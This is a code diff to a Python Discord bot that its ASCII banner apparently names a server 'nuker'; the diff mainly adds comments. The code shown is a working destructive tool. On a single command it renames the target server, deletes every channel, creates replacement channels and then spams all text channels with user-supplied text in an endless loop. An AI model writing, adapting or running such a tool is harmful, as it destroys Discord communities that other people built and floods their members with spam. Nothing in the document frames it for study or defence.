@@ -1,18 +1,22 @@
+# libs
 import discord
 import random
 import os
 import time
 from discord.ext import commands
 
+# prefix
 BOT_PREFIX = "$"
 
 bot = commands.Bot(command_prefix=BOT_PREFIX, case_insensitive=True)
 bot.remove_command('Help')
 
+# token
 token = "ENTER TOKEN HERE"
 
 print("[+] Checking token...")
 
+# invalid command
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.CommandNotFound):
@@ -20,9 +24,11 @@ async def on_command_error(ctx, error):
 
 @bot.event
 async def on_ready():
+    # valid token
     print("[+] Valid token!")
     time.sleep(1)
-    os.system('cls')                                                        
+    os.system('cls')
+    # cool text
     print("""{}
 
     ███████╗██╗   ██╗██████╗  ██████╗ ███████╗    ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
@@ -39,15 +45,18 @@ async def start(ctx):
     await ctx.message.delete()
     guild = ctx.guild
 
+    # inputs
     server_name = input("[+] Enter server name here: ")
     channel = input("[+] Enter channel name here: ")
     spam_txt = input("[+] Enter text to spam here: ")
     
     channel_names = [channel]
-
+    
+    # changing server name
     await ctx.guild.edit(name=server_name)
     print(f"\n[+] Server named changed to '{server_name}'")
-
+    
+    # deleting channels
     for channel in list(ctx.message.guild.channels):
         try:
             await channel.delete()
@@ -55,6 +64,7 @@ async def start(ctx):
             pass
     print("[+] All channels have been deleted")
 
+    # making new channels
     for i in range(1):
         await guild.create_text_channel(random.choice(channel_names))
         for channel in guild.text_channels:
@@ -62,12 +72,14 @@ async def start(ctx):
                 await guild.create_text_channel(random.choice(channel_names))
     print("[+] New channels have been made")
 
+    # spamming channels
     time.sleep(1)
     print("[+] Spamming server")
     while True:
         for channel in guild.text_channels:
             await channel.send(f"{spam_txt}")
 
+# running bot
 try:
     bot.run(token)
 except discord.errors.HTTPException and discord.errors.LoginFailure:
